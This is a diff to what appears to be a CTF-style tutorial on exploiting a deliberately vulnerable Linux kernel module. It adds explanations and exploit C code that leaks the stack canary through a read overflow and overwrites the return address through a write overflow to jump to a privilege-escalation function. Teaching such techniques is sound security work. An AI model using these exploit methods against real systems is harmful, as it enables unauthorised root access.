@@ -135,7 +135,7 @@ void escalate_privileges()
 
 
 ## A Vulnerable Kernel Module
-...
+I've written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its `challenge_read` and `challenge_write` functions.
 
 [challenge.c](/files/linux-kernel/1/challenge.c)
 
@@ -200,7 +200,9 @@ void cleanup_module(void)
 }
 {{< /code >}}
 
-...
+In the code block below we can see the kernel module's `read` handler. It copies an arbitrary number of bytes from a 128 byte buffer into a globally accessible buffer `out` of size 256 bytes. This means we can read 128 bytes below the small `tmp` buffer.
+
+Perhaps we can use this to read stack values (e.g. the value of the stack canary).
 
 ```c
 static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
@@ -211,7 +213,9 @@ static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *of
 }
 ```
 
-...
+In the code block below we can see the kernel module's `write` handler. It copies an arbitrary number of bytes into a 256 byte buffer `out`, that are then copied into a buffer stored on the stack `tmp` of size 128 bytes.
+
+This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.
 
 ```c
 static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
@@ -226,7 +230,7 @@ static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, lof
 ```
 
 ## Exploiting the Kernel Module
-...
+First, let's use the buffer overflow vulnerability in the kernel module's `read` function to dump a bunch of stack values. The below code reads 32 `unsigned long` values (256 bytes) and prints them out.
 
 ```c
 #include <stdio.h>
@@ -244,50 +248,51 @@ int main(int argc, char **argv)
     read(fd, leak, sizeof(unsigned long) * 32);
 
     for (int i = 0; i < 32; ++i)
-        printf("0x%lx\n", leak[i]);
+        printf("%d: 0x%lx\n", i, leak[i]);
 
     return 0;
 }
 ```
 
-...
+In the output below we can see a couple values that look like a stack canary and a return address in kernel-space. We can see these are at indexes 16 and 17. 
 
 ```
 /home/ctf # ./exploit
-0xffffffff81c00194
-0xffffffff81c001a0
-0xffffffff81aa85a0
-0xffffffff81345d8b
-0x4
-0xffff888006bf5700
-0x20000075a4070
-0xffff888006bf5710
-0x100020000
-0x0
-0xffff888000000000
-0x0
-0x0
-0x0
-0x0
-0xa73ee2eeab3d9f00  <-- stack canary
-0xa73ee2eeab3d9f00
-0xffff888006bcd840  <-- return address
-0xfffffffffffffffb
-0xffffffff8123e347
-0x1
-0x0
-0xffffffff811c89f8
-0xffff888006bf5700
-0xffff888006bf5700
-0x7ffeeb3f3d10
-0x100
-0x0
-0x0
-0xffffffff811c8d1a
-0x0
-0xa73ee2eeab3d9f00
+0: 0xffffffff81c00194
+1: 0xffffffff81c001a0
+2: 0xffffffff81aa85a0
+3: 0xffffffff81345d8b
+4: 0x4
+5: 0xffff888006bf5700
+6: 0x20000075a4070
+7: 0xffff888006bf5710
+8: 0x100020000
+9: 0x0
+10: 0xffff888000000000
+11: 0x0
+12: 0x0
+13: 0x0
+14: 0x0
+15: 0xa73ee2eeab3d9f00
+16: 0xa73ee2eeab3d9f00  <-- stack canary
+17: 0xffff888006bcd840  <-- return address
+18: 0xfffffffffffffffb
+19: 0xffffffff8123e347
+20: 0x1
+21: 0x0
+22: 0xffffffff811c89f8
+23: 0xffff888006bf5700
+24: 0xffff888006bf5700
+25: 0x7ffeeb3f3d10
+26: 0x100
+27: 0x0
+28: 0x0
+29: 0xffffffff811c8d1a
+30: 0x0
+31: 0xa73ee2eeab3d9f00
 ```
-...
+
+Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the `tmp` buffer on the stack).
 
 ```c
 unsigned long leak_canary(int fd)
@@ -298,14 +303,14 @@ unsigned long leak_canary(int fd)
 }
 ```
 
-...
+We should also write a function that overflows the buffer in the `write` handler and redirect process execution to our `escalate_privileges` function. We'll also want to overwrite the stack canary so the kernel module doesn't detect the overflow and halt execution.
 
 ```c
 void overflow_buffer(int fd, unsigned long canary)
 {
     unsigned long payload[18];
 
-    payload[15] = canary;
+    payload[16] = canary;
     payload[17] = (unsigned long)escalate_privileges;
 
     write(fd, payload, sizeof(unsigned long) * 18);
